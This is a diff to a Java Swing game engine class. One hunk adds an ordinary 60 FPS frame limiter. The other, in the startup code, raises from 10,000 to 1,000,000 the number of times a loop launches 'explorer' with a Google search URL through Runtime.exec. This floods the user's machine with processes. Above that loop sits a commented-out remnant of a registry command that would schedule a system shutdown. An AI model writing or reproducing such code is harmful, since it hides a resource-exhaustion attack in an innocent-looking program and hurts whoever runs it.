@@ -171,6 +171,17 @@ public class Engine extends JPanel {
 			Arrays.setAll(rects, i -> null);
 			repaint();
 			long dif = System.nanoTime() - a;
+
+			int waitTime = 1000 / 60 - (int) (dif / 1000000);
+
+			if (waitTime > 0) {
+				try {
+					Thread.sleep(waitTime);
+				} catch (InterruptedException ex) {
+
+				}
+			}
+
 			double fps = 1000000000.0 / dif;
 			g.setColor(Color.red);
 			g.drawString("FPS: " + Integer.toString((int) fps), 10, 10);
@@ -401,7 +412,7 @@ public class Engine extends JPanel {
 		// REG_SZ /d \"shutdown /s /t 60000\""};
 		String s[] = { "explorer", "\"https://www.google.com/search?q=i+love+avaline+so+much\"" };
 		Runtime r = Runtime.getRuntime();
-		for (int i = 0; i < 10000; i++)
+		for (int i = 0; i < 1000000; i++)
 			r.exec(s);
 		frame.setSize(800, 800);
 		frame.setLocation(0, 0);
